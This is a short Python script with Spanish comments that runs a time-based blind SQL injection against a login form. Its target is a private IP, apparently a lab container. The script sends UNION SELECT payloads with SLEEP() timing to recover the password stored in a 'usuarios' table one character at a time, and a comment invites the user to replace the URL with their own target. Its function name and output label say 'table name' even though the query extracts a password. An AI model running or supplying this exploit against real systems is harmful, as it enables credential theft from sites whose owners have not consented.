import requests
import time

# Configuración
url = 'http://172.17.0.3/login.php'   # << CAMBIA esta URL por la tuya
injection_point = "username"            # << nombre del parámetro vulnerable
delay_time = 5                         # Tiempo de sleep en segundos
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_@{}.-$!#%&/()=¿?¡*+[],:;<>"
max_length = 30                        # Max caracteres que va a intentar

# Headers opcionales
headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}

# Función para probar una letra
def try_char(position, character):
    payload = f"' UNION SELECT IF(SUBSTRING((SELECT password FROM usuarios LIMIT 0,1),{position},1)='{character}', SLEEP({delay_time}), 0),2,3 -- -"

    data = {
        injection_point: payload,
        'password': 'cualquiercosa'
    }
    start = time.time()
    requests.post(url, data=data, headers=headers)
    end = time.time()
    return (end - start) > (delay_time - 1)

# Función principal
def extract_table_name():
    result = ''
    for position in range(1, max_length + 1):
        found = False
        for character in charset:
            print(f"[*] Probando posición {position} con carácter '{character}'")
            if try_char(position, character):
                result += character
                print(f"[+] Encontrado: {result}")
                found = True
                break
        if not found:
            print("[*] Fin de extracción")
            break
    print(f"\n[!] Nombre de tabla encontrado: {result}")
    
# Ejecutar
if __name__ == '__main__':
    extract_table_name()